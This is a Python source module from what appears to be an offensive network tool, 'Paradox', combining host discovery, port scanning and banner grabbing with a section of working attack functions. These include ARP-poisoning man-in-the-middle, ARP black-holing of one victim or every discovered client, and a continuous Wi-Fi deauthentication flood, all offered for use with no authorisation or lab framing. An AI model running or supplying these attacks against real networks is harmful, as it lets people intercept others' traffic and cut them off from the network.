#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
paradox.core — shared foundation  ·  Paradox Tech 2026
"""

from __future__ import annotations

import os
import sys
import socket
import struct
import subprocess
import threading
import time
import random
import re
import json
import signal
import ipaddress
from dataclasses import dataclass, field
from typing import Optional, Callable, List
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, MofNCompleteColumn, TimeElapsedColumn
    from rich.live import Live
    from rich.text import Text
    from rich import box
except ImportError:
    print("[!] pip install rich")
    sys.exit(1)

console = Console()

# ─── constants ──────────────────────────────────────────────────────────────

VERSION      = "4.0.0"
BUILD        = "PARADOX-TECH-2026"
SEV_WEIGHT   = {"LOW": 1, "MEDIUM": 3, "HIGH": 7, "CRITICAL": 15}
SEV_COLOR    = {"LOW": "green", "MEDIUM": "yellow", "HIGH": "red", "CRITICAL": "bold red"}
SEV_ORDER    = ("LOW", "MEDIUM", "HIGH", "CRITICAL")

OUI_TABLE: dict[str, str] = {
    "00:50:56": "VMware",       "00:0c:29": "VMware",       "00:50:f2": "Microsoft",
    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi", "e4:5f:01": "Raspberry Pi",
    "94:65:2d": "Apple",        "f0:b4:29": "Apple",        "3c:22:fb": "Apple",
    "78:4f:43": "Apple",        "00:1b:63": "Apple",        "28:d2:44": "Samsung",
    "8c:77:12": "Samsung",      "00:16:3e": "Xen/AWS",      "52:54:00": "QEMU/KVM",
    "00:1c:bf": "Intel",        "70:3a:51": "Intel",        "18:60:24": "Huawei",
    "d8:49:2f": "Xiaomi",       "00:11:32": "Synology",     "68:7f:74": "TP-Link",
    "cc:2d:e0": "TP-Link",      "00:1a:a0": "Dell",         "fc:aa:14": "ASUSTek",
    "04:d4:c4": "ASUSTek",      "00:e0:4c": "Realtek",      "a4:c3:f0": "Google",
    "08:00:27": "VirtualBox",   "14:91:82": "Ubiquiti",     "24:a4:3c": "Ubiquiti",
    "b4:fb:e4": "Fortinet",     "00:09:0f": "Fortinet",     "2c:c8:1b": "MikroTik",
    "d4:ca:6d": "MikroTik",     "1c:98:ec": "HP",           "3c:d9:2b": "HP",
    "00:23:ae": "Cisco",        "00:1e:49": "Cisco",        "f8:72:ea": "Cisco",
    "00:17:c8": "Netgear",      "20:e5:2a": "Netgear",      "84:1b:5e": "Netgear",
    "9c:5c:8e": "Belkin",       "ec:1a:59": "Belkin",       "00:26:b9": "Dell",
    "b0:83:fe": "Intel",        "8c:8d:28": "Intel",        "40:a3:6b": "LG",
    "cc:4b:73": "LG",           "00:1d:7e": "Linksys",      "00:21:29": "Linksys",
}

PORT_SERVICE: dict[int, str] = {
    21: "FTP",    22: "SSH",      23: "Telnet",   25: "SMTP",    53: "DNS",
    67: "DHCP",   68: "DHCP",     69: "TFTP",     80: "HTTP",    110: "POP3",
    119: "NNTP",  123: "NTP",     135: "MSRPC",   137: "NetBIOS",139: "NetBIOS",
    143: "IMAP",  161: "SNMP",    179: "BGP",     389: "LDAP",   443: "HTTPS",
    445: "SMB",   465: "SMTPS",   514: "Syslog",  515: "LPD",    587: "SMTP-S",
    631: "IPP",   636: "LDAPS",   993: "IMAPS",   995: "POP3S",  1080: "SOCKS",
    1194: "OpenVPN", 1433: "MSSQL", 1521: "Oracle", 1723: "PPTP", 2049: "NFS",
    2375: "Docker",  2376: "DockerTLS", 2379: "etcd", 3000: "NodeJS", 3128: "Squid",
    3306: "MySQL",   3389: "RDP",   4000: "NodeJS", 4443: "HTTPS-Alt", 5000: "Flask",
    5432: "PostgreSQL", 5601: "Kibana", 5900: "VNC", 6379: "Redis", 6443: "K8s",
    7001: "WebLogic",   8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "Jupyter",
    9000: "Portainer",  9090: "Prometheus", 9200: "Elasticsearch", 9300: "ES-Cluster",
    10250: "kubelet",   11211: "Memcached", 27017: "MongoDB",   27018: "MongoDB",
    50070: "Hadoop",
}

COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 1433, 1521,
    2375, 2376, 2379, 3000, 3128, 3306, 3389, 4443, 5000, 5432,
    5601, 5900, 6379, 6443, 7001, 8080, 8443, 8888, 9000, 9090,
    9200, 10250, 11211, 27017,
]

# Extended banner probes — more services fingerprinted
_BANNER_PROBES: dict[int, bytes] = {
    21:    b"",
    22:    b"",
    23:    b"",
    25:    b"EHLO paradox\r\n",
    80:    b"GET / HTTP/1.0\r\nHost: x\r\nUser-Agent: Paradox/4.0\r\n\r\n",
    110:   b"+OK\r\n",
    143:   b"",
    443:   b"",
    445:   b"",
    6379:  b"PING\r\n",
    8080:  b"GET / HTTP/1.0\r\nHost: x\r\nUser-Agent: Paradox/4.0\r\n\r\n",
    8888:  b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
    9200:  b"GET / HTTP/1.0\r\nHost: x\r\n\r\n",
    27017: b"\x3a\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x1b\x00\x00\x00\x10serverStatus\x00\x01\x00\x00\x00\x00",
}


# ─── data models ────────────────────────────────────────────────────────────

@dataclass
class Host:
    ip:          str
    mac:         str  = "unknown"
    vendor:      str  = "unknown"
    hostname:    str  = "unknown"
    os_guess:    str  = "unknown"
    ttl:         int  = 0
    rtt_ms:      float = 0.0            # round-trip time — used for adaptive scan
    open_ports:  dict = field(default_factory=dict)   # port -> banner str
    services:    dict = field(default_factory=dict)   # port -> fingerprint dict
    findings:    list = field(default_factory=list)
    risk_score:  int  = 0
    alive:       bool = True
    first_seen:  float = field(default_factory=time.time)

    def add_finding(self, desc: str, sev: str, rem: str = "", cve: str = "") -> None:
        # deduplicate
        for f in self.findings:
            if f["description"] == desc:
                return
        self.findings.append({
            "description": desc, "severity": sev,
            "remediation": rem, "cve": cve,
        })
        self.risk_score += SEV_WEIGHT.get(sev, 0)

    @property
    def risk_label(self) -> str:
        if self.risk_score == 0:   return "CLEAN"
        if self.risk_score < 10:   return "LOW"
        if self.risk_score < 30:   return "MEDIUM"
        if self.risk_score < 60:   return "HIGH"
        return "CRITICAL"


@dataclass
class NetworkInfo:
    iface:       str   = ""
    ssid:        str   = "unknown"
    bssid:       str   = "unknown"
    channel:     int   = 0
    signal_dbm:  int   = 0
    frequency:   str   = ""
    encryption:  str   = ""
    our_ip:      str   = ""
    our_mac:     str   = ""
    gateway_ip:  str   = ""
    gateway_mac: str   = ""
    subnet_cidr: str   = ""


# ─── root / env helpers ─────────────────────────────────────────────────────

def require_root() -> None:
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        console.print(Panel(
            "[bold red][!] Root privileges required.[/bold red]\n"
            "[dim]Run:  sudo python3 paradox_netscan.py[/dim]",
            border_style="red", expand=False,
        ))
        sys.exit(1)


def get_vendor(mac: str) -> str:
    if not mac or mac == "unknown":
        return "Unknown"
    prefix = mac[:8].lower().replace("-", ":")
    return OUI_TABLE.get(prefix, "Unknown")


def get_default_iface() -> str:
    try:
        out = subprocess.check_output(
            ["ip", "route", "show", "default"], text=True, stderr=subprocess.DEVNULL
        )
        for line in out.splitlines():
            if "dev" in line:
                parts = line.split()
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    for name in ("wlan0", "wlan1", "wlp2s0", "eth0", "en0"):
        if Path(f"/sys/class/net/{name}").exists():
            return name
    try:
        links = [x for x in os.listdir("/sys/class/net") if x != "lo"]
        if links:
            return links[0]
    except Exception:
        pass
    return "wlan0"


def get_local_ip(iface: str) -> str:
    try:
        out = subprocess.check_output(
            ["ip", "-4", "addr", "show", iface], text=True, stderr=subprocess.DEVNULL
        )
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
        if m:
            return m.group(1)
    except Exception:
        pass
    return "127.0.0.1"


def get_local_cidr(iface: str) -> str:
    try:
        out = subprocess.check_output(
            ["ip", "addr", "show", iface], text=True, stderr=subprocess.DEVNULL
        )
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", out)
        if m:
            return str(ipaddress.IPv4Network(f"{m.group(1)}/{m.group(2)}", strict=False))
    except Exception:
        pass
    return "192.168.1.0/24"


def get_gateway_ip() -> str:
    try:
        out = subprocess.check_output(
            ["ip", "route", "show", "default"], text=True, stderr=subprocess.DEVNULL
        )
        for line in out.splitlines():
            if "default" in line and "via" in line:
                parts = line.split()
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return ""


def resolve_mac(ip: str, iface: str = "") -> str:
    try:
        from scapy.all import getmacbyip
        mac = getmacbyip(ip)
        if mac:
            return mac.lower()
    except Exception:
        pass
    try:
        subprocess.run(
            ["ping", "-c", "1", "-W", "1", ip],
            capture_output=True, timeout=2,
        )
        out = subprocess.check_output(["arp", "-n", ip], text=True, stderr=subprocess.DEVNULL)
        m = re.search(
            r"([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})",
            out, re.I,
        )
        if m:
            return m.group(1).lower()
    except Exception:
        pass
    return "unknown"


def ttl_os_guess(ttl: int) -> str:
    if ttl <= 0:         return "unknown"
    if 60 <= ttl <= 65:  return "Linux / Android"
    if 126 <= ttl <= 129: return "Windows"
    if 253 <= ttl <= 256: return "Cisco / Network Device"
    if ttl > 100:        return "Windows (NAT)"
    if ttl > 60:         return "Linux (NAT)"
    if 32 <= ttl <= 35:  return "FreeBSD / macOS"
    return f"Unknown (TTL={ttl})"


def icmp_ttl(ip: str) -> tuple[int, float]:
    """Returns (ttl, rtt_ms). Both 0 on failure."""
    try:
        t0  = time.time()
        out = subprocess.check_output(
            ["ping", "-c", "1", "-W", "1", ip],
            text=True, stderr=subprocess.DEVNULL, timeout=3,
        )
        rtt = (time.time() - t0) * 1000
        m   = re.search(r"ttl=(\d+)", out, re.I)
        if m:
            return int(m.group(1)), round(rtt, 1)
    except Exception:
        pass
    return 0, 0.0


def resolve_hostname(ip: str) -> str:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return "unknown"


# ─── network info ───────────────────────────────────────────────────────────

def collect_network_info(iface: str) -> NetworkInfo:
    net             = NetworkInfo(iface=iface)
    net.our_ip      = get_local_ip(iface)
    net.subnet_cidr = get_local_cidr(iface)
    net.gateway_ip  = get_gateway_ip()

    try:
        net.our_mac = Path(f"/sys/class/net/{iface}/address").read_text().strip().lower()
    except Exception:
        try:
            out = subprocess.check_output(
                ["ip", "link", "show", iface], text=True, stderr=subprocess.DEVNULL
            )
            m = re.search(r"link/ether\s+([0-9a-f:]+)", out)
            if m:
                net.our_mac = m.group(1).lower()
        except Exception:
            pass

    if net.gateway_ip:
        net.gateway_mac = resolve_mac(net.gateway_ip, iface)

    # WiFi details via iw
    try:
        out = subprocess.check_output(
            ["iw", "dev", iface, "link"], text=True, stderr=subprocess.DEVNULL
        )
        m = re.search(r"Connected to ([0-9a-f:]+)", out, re.I)
        if m:
            net.bssid = m.group(1).lower()
        m = re.search(r"SSID: (.+)", out)
        if m:
            net.ssid = m.group(1).strip()
        m = re.search(r"signal: (-\d+)", out)
        if m:
            net.signal_dbm = int(m.group(1))
        m = re.search(r"freq: (\d+)", out)
        if m:
            freq = int(m.group(1))
            net.frequency = f"{freq} MHz"
            if 2412 <= freq <= 2484:
                net.channel = (freq - 2412) // 5 + 1
            elif freq >= 5180:
                net.channel = (freq - 5000) // 5
    except Exception:
        pass

    if net.ssid == "unknown":
        try:
            out = subprocess.check_output(
                ["iwconfig", iface], text=True, stderr=subprocess.DEVNULL
            )
            m = re.search(r'ESSID:"([^"]+)"', out)
            if m:
                net.ssid = m.group(1)
            m = re.search(r"Access Point: ([0-9A-Fa-f:]+)", out)
            if m:
                net.bssid = m.group(1).lower()
        except Exception:
            pass

    return net


def print_network_info(net: NetworkInfo) -> None:
    w = console.width
    t = Table(
        title="[bold red]◈  Network Interface[/bold red]",
        box=box.ROUNDED,
        expand=(w > 100),
        show_header=True,
        header_style="bold dim",
    )
    t.add_column("Field",  style="bold cyan", width=16)
    t.add_column("Value",  style="green")

    signal_str = ""
    if net.signal_dbm:
        bars = "▂▄▆█"
        idx  = min(3, max(0, (net.signal_dbm + 90) // 15))
        signal_str = f"{net.signal_dbm} dBm  {bars[idx]}"

    for label, val in [
        ("Interface",   net.iface),
        ("SSID",        net.ssid),
        ("BSSID",       net.bssid),
        ("Channel",     str(net.channel) if net.channel else "?"),
        ("Signal",      signal_str or "?"),
        ("Our IP",      net.our_ip),
        ("Our MAC",     net.our_mac),
        ("Gateway IP",  net.gateway_ip),
        ("Gateway MAC", net.gateway_mac),
        ("Subnet",      net.subnet_cidr),
    ]:
        t.add_row(label, val or "—")
    console.print(t)


# ─── discovery ──────────────────────────────────────────────────────────────

def arp_scan(cidr: str, iface: str, timeout: float = 2.5) -> list[Host]:
    hosts: list[Host] = []
    console.print(f"[yellow][*] ARP scan  {cidr}  on  {iface}[/yellow]")

    with Progress(
        SpinnerColumn(style="bold red"),
        TextColumn("[bold white]{task.description}"),
        TimeElapsedColumn(),
        transient=True,
    ) as prog:
        tid = prog.add_task("Sending ARP requests …", total=None)

        try:
            from scapy.all import ARP, Ether, srp
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
                timeout=timeout, verbose=False, iface=iface,
            )
            prog.update(tid, description=f"Got {len(ans)} replies — resolving …")
            for _, rcv in ans:
                ip  = rcv.psrc
                mac = rcv.hwsrc.lower()
                ttl, rtt = icmp_ttl(ip)
                hosts.append(Host(
                    ip=ip, mac=mac, vendor=get_vendor(mac),
                    hostname=resolve_hostname(ip),
                    os_guess=ttl_os_guess(ttl), ttl=ttl, rtt_ms=rtt,
                ))
        except ImportError:
            console.print("[red][!] pip install scapy[/red]")
        except Exception as e:
            console.print(f"[red][!] ARP scan: {e}[/red]")

        # supplement from kernel ARP cache
        prog.update(tid, description="Reading ARP cache …")
        try:
            for line in Path("/proc/net/arp").read_text().splitlines()[1:]:
                parts = line.split()
                if len(parts) < 4:
                    continue
                ip, mac, flags = parts[0], parts[3].lower(), parts[2]
                if mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff") or flags == "0x0":
                    continue
                if any(h.ip == ip for h in hosts):
                    continue
                ttl, rtt = icmp_ttl(ip)
                hosts.append(Host(
                    ip=ip, mac=mac, vendor=get_vendor(mac),
                    hostname=resolve_hostname(ip),
                    os_guess=ttl_os_guess(ttl), ttl=ttl, rtt_ms=rtt,
                ))
        except Exception:
            pass

    _color = "green" if hosts else "red"
    console.print(f"[{_color}][+] {len(hosts)} host{'s' if len(hosts) != 1 else ''} discovered[/{_color}]")
    return hosts


def print_hosts(hosts: list[Host], title: str = "Live Hosts") -> None:
    w = console.width

    t = Table(
        title=f"[bold red]◈  {title}[/bold red]",
        box=box.ROUNDED,
        expand=(w > 100),
        show_header=True,
        header_style="bold dim red",
        row_styles=["", "dim"],
    )
    t.add_column("#",        style="bold cyan",    width=4,  justify="right")
    t.add_column("IP",       style="bold green",   width=16)
    t.add_column("MAC",      style="dim",          width=18)
    t.add_column("Vendor",   style="yellow",       width=14)

    if w > 110:
        t.add_column("Hostname", style="dim white", width=22)
        t.add_column("OS",       style="magenta",   width=18)
        t.add_column("RTT",      style="dim cyan",  width=8, justify="right")

    t.add_column("Ports",    style="red",          width=18)
    t.add_column("Risk",     style="bold",         width=9, justify="right")

    for i, h in enumerate(hosts, 1):
        ports = ",".join(str(p) for p in sorted(h.open_ports)[:6]) or "—"
        rc    = SEV_COLOR.get(h.risk_label, "dim")
        risk  = f"[{rc}]{h.risk_label}[/{rc}]" if h.risk_score else "[dim]CLEAN[/dim]"

        row = [str(i), h.ip, h.mac, h.vendor[:13]]
        if w > 110:
            rtt_str = f"{h.rtt_ms:.1f}ms" if h.rtt_ms else "—"
            row += [h.hostname[:21], h.os_guess[:17], rtt_str]
        row += [ports, risk]
        t.add_row(*row)

    console.print(t)


def select_host(hosts: list[Host]) -> Optional[Host]:
    if not hosts:
        console.print("[red]No hosts discovered yet. Run a scan first.[/red]")
        return None
    print_hosts(hosts)
    raw = Prompt.ask("[bold cyan]Select host #[/bold cyan]  (0 = cancel)", default="0")
    try:
        idx = int(raw) - 1
        if 0 <= idx < len(hosts):
            return hosts[idx]
    except ValueError:
        pass
    return None


# ─── port scan — adaptive threading based on host RTT ───────────────────────

def grab_banner(ip: str, port: int, timeout: float = 2.5) -> str:
    probe = _BANNER_PROBES.get(port, b"")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if probe:
            s.sendall(probe)
        else:
            time.sleep(0.3)
        data = s.recv(2048).decode("utf-8", errors="ignore").strip()
        s.close()
        return data[:200]
    except Exception:
        return ""


def _fingerprint_service(port: int, banner: str) -> dict:
    """Extract structured info from a banner."""
    info: dict = {"port": port, "service": PORT_SERVICE.get(port, "?"), "banner": banner}

    # HTTP version / server header
    m = re.search(r"Server:\s*(.+)", banner, re.I)
    if m:
        info["server"] = m.group(1).strip()

    # SSH version
    m = re.search(r"SSH-[\d.]+-(\S+)", banner)
    if m:
        info["ssh_version"] = m.group(1)

    # Redis
    if "+PONG" in banner:
        info["redis_unauth"] = True

    # Elasticsearch
    if '"cluster_name"' in banner:
        m = re.search(r'"number"\s*:\s*"([^"]+)"', banner)
        if m:
            info["es_version"] = m.group(1)

    # FTP
    m = re.search(r"220[- ](.+)", banner)
    if m:
        info["ftp_banner"] = m.group(1).strip()[:60]

    return info


def scan_ports(host: Host, ports: list[int] | None = None, workers: int | None = None) -> None:
    if ports is None:
        ports = COMMON_PORTS

    # adaptive workers: fast hosts get more parallelism
    if workers is None:
        workers = 100 if host.rtt_ms < 5 else (50 if host.rtt_ms < 20 else 20)

    console.print(f"[yellow][*] Scanning [bold]{host.ip}[/bold]  {len(ports)} ports  {workers} threads[/yellow]")

    found   = []
    done    = [0]
    total   = len(ports)
    lock    = threading.Lock()

    def _check(port: int) -> None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            if s.connect_ex((host.ip, port)) == 0:
                s.close()
                banner = grab_banner(host.ip, port)
                fp     = _fingerprint_service(port, banner)
                with lock:
                    host.open_ports[port]  = banner
                    host.services[port]    = fp
                    found.append(port)
            else:
                s.close()
        except Exception:
            pass
        finally:
            with lock:
                done[0] += 1

    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[bold white]{task.description}"),
        BarColumn(bar_width=30, style="dim red", complete_style="red"),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        transient=True,
    ) as prog:
        tid = prog.add_task(f"Port scan {host.ip}", total=total)
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_check, p): p for p in ports}
            for _ in as_completed(futures):
                prog.update(tid, advance=1)

    if found:
        for p in sorted(found):
            svc = PORT_SERVICE.get(p, "?")
            bn  = host.open_ports[p][:60]
            console.print(f"  [bold green]OPEN[/bold green]  [cyan]{p:5d}[/cyan]  [yellow]{svc:<14}[/yellow]  [dim]{bn}[/dim]")
    else:
        console.print("  [dim]No open ports found in scanned range.[/dim]")


# ─── attack primitives ──────────────────────────────────────────────────────

def arp_poison(victim_ip: str, gateway_ip: str, iface: str) -> None:
    """Bidirectional ARP MITM. Ctrl-C restores."""
    console.print(f"[bold red][*] ARP MITM  {victim_ip} ↔ {gateway_ip}[/bold red]")
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr
    except ImportError:
        console.print("[red]pip install scapy[/red]")
        return

    victim_mac  = resolve_mac(victim_ip, iface)
    gateway_mac = resolve_mac(gateway_ip, iface)
    our_mac     = get_if_hwaddr(iface)

    if victim_mac == "unknown" or gateway_mac == "unknown":
        console.print("[red][-] MAC resolution failed[/red]")
        return

    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")
    except Exception:
        pass

    pkt_v = Ether(dst=victim_mac, src=our_mac) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=our_mac
    )
    pkt_g = Ether(dst=gateway_mac, src=our_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=our_mac
    )

    stop = threading.Event()

    def _loop() -> None:
        while not stop.is_set():
            try:
                sendp([pkt_v, pkt_g], iface=iface, verbose=False)
            except Exception:
                pass
            time.sleep(1.5)

    threading.Thread(target=_loop, daemon=True).start()
    console.print("[green][+] MITM active. Ctrl-C to stop + restore.[/green]")
    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()
        restore_v = Ether(dst=victim_mac, src=gateway_mac) / ARP(
            op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac
        )
        restore_g = Ether(dst=gateway_mac, src=victim_mac) / ARP(
            op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac
        )
        try:
            sendp([restore_v, restore_g] * 5, iface=iface, verbose=False)
            console.print("[green][+] ARP restored.[/green]")
        except Exception:
            pass
        try:
            Path("/proc/sys/net/ipv4/ip_forward").write_text("0\n")
        except Exception:
            pass


def arp_blackhole(victim_ip: str, gateway_ip: str, iface: str, duration: int = 0) -> None:
    console.print(f"[bold red][*] ARP Black Hole → {victim_ip}[/bold red]")
    try:
        from scapy.all import ARP, Ether, sendp
    except ImportError:
        console.print("[red]pip install scapy[/red]")
        return

    victim_mac = resolve_mac(victim_ip, iface)
    if victim_mac == "unknown":
        console.print(f"[red][-] Cannot resolve MAC for {victim_ip}[/red]")
        return

    dead    = "de:ad:00:00:be:ef"
    poison  = Ether(dst=victim_mac, src=dead) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=dead
    )
    stop    = threading.Event()
    start   = time.time()
    sent    = [0]

    def _loop() -> None:
        while not stop.is_set():
            try:
                sendp(poison, iface=iface, verbose=False)
                sent[0] += 1
            except Exception:
                pass
            if duration and (time.time() - start) >= duration:
                stop.set()
            time.sleep(0.8)

    threading.Thread(target=_loop, daemon=True).start()
    console.print("[green][+] Internet cut. Ctrl-C to restore.[/green]")
    try:
        while not stop.is_set():
            elapsed = time.time() - start
            console.print(
                f"[dim]  poison pkts: {sent[0]}  elapsed: {elapsed:.0f}s[/dim]", end="\r"
            )
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        console.print()
        real_gw = resolve_mac(gateway_ip, iface)
        if real_gw != "unknown":
            restore = Ether(dst=victim_mac, src=real_gw) / ARP(
                op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=real_gw
            )
            try:
                sendp([restore] * 5, iface=iface, verbose=False)
                console.print("[green][+] ARP restored.[/green]")
            except Exception:
                pass


def mass_arp_blackhole(targets: list[Host], gateway_ip: str, iface: str) -> None:
    console.print(f"[bold red][*] Mass ARP Black Hole — {len(targets)} clients[/bold red]")
    try:
        from scapy.all import ARP, Ether, sendp
    except ImportError:
        console.print("[red]pip install scapy[/red]")
        return

    dead = "de:ad:00:00:be:ef"
    pkts = [
        Ether(dst=c.mac, src=dead) / ARP(
            op=2, pdst=c.ip, hwdst=c.mac, psrc=gateway_ip, hwsrc=dead
        )
        for c in targets if c.mac != "unknown"
    ]
    if not pkts:
        console.print("[red]No valid MACs.[/red]")
        return

    stop  = threading.Event()
    sent  = [0]

    def _loop() -> None:
        while not stop.is_set():
            try:
                sendp(pkts, iface=iface, verbose=False)
                sent[0] += len(pkts)
            except Exception:
                pass
            time.sleep(1.0)

    threading.Thread(target=_loop, daemon=True).start()
    console.print(f"[green][+] {len(pkts)} clients cut. Ctrl-C to stop.[/green]")
    try:
        while True:
            console.print(f"[dim]  poison cycles: {sent[0]}[/dim]", end="\r")
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()
    console.print("\n[yellow][*] Stopped. Tables restore on next real traffic.[/yellow]")


def deauth_flood(iface: str, bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff", count: int = 0) -> None:
    console.print(f"[bold red][*] Deauth → AP {bssid}  client {client_mac}[/bold red]")
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    except ImportError:
        console.print("[red]pip install scapy[/red]")
        return

    pkt = (
        RadioTap()
        / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )
    stop  = threading.Event()
    sent  = [0]
    start = time.time()

    def _loop() -> None:
        while not stop.is_set():
            try:
                n = 64 if count == 0 else min(64, count - sent[0])
                if n <= 0:
                    stop.set()
                    break
                sendp(pkt, iface=iface, verbose=False, count=n)
                sent[0] += n
            except Exception:
                pass
            time.sleep(0.05)

    threading.Thread(target=_loop, daemon=True).start()

    with Live(refresh_per_second=4, console=console) as live:
        try:
            while not stop.is_set():
                elapsed = time.time() - start
                rate    = sent[0] / max(elapsed, 0.1)
                live.update(Text.from_markup(
                    f"[bold red]DEAUTH[/bold red]  "
                    f"frames: [yellow]{sent[0]:,}[/yellow]  "
                    f"rate: [cyan]{rate:.0f}/s[/cyan]  "
                    f"elapsed: [dim]{elapsed:.1f}s[/dim]"
                ))
                time.sleep(0.25)
        except KeyboardInterrupt:
            stop.set()

    console.print(f"[green][+] Done.  Frames sent: {sent[0]:,}[/green]")


def setup_monitor_mode(iface: str) -> Optional[str]:
    console.print(f"[yellow][*] Enabling monitor mode on {iface}...[/yellow]")
    try:
        subprocess.run(["ip", "link", "set", iface, "down"],       check=True, capture_output=True)
        subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], check=True, capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"],         check=True, capture_output=True)
        console.print(f"[green][+] {iface} in monitor mode[/green]")
        return iface
    except Exception:
        pass
    try:
        out = subprocess.check_output(
            ["airmon-ng", "start", iface], text=True, stderr=subprocess.DEVNULL
        )
        m = re.search(r"monitor mode .* (?:on|for) (\S+)", out, re.I)
        if m:
            mon = m.group(1).strip("[])(")
            console.print(f"[green][+] Monitor iface: {mon}[/green]")
            return mon
    except Exception:
        pass
    console.print("[red][-] Monitor mode failed. USB adapter usually required.[/red]")
    return None


# ─── small utils ────────────────────────────────────────────────────────────

def safe_int(raw: str, default: int = 0) -> int:
    try:
        return int(raw)
    except (ValueError, TypeError):
        return default


def confirm(msg: str, default: str = "no") -> bool:
    return Prompt.ask(f"[bold red]{msg}[/bold red]  [dim](y/n)[/dim]", default=default).lower() in ("y", "yes")
